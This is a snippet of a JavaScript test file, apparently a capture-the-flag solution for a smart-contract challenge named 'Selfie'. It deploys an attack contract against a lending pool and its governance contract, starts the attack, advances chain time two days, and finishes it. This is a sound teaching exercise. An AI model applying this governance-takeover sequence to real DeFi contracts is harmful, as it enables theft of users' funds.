...
describe('[Challenge] Selfie', function () {
  ...
  it('Exploit', async function () {
    ...
    const AttackSelfiePoolFactory = await ethers.getContractFactory(
      'AttackSelfiePool',
      attacker
    );
    const attackSelfiePool = await AttackSelfiePoolFactory.deploy(
      this.pool.address,
      this.governance.address
    );
    await attackSelfiePool.attackStart();
    await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]); // 2 days
    await attackSelfiePool.attackFinish();
  });
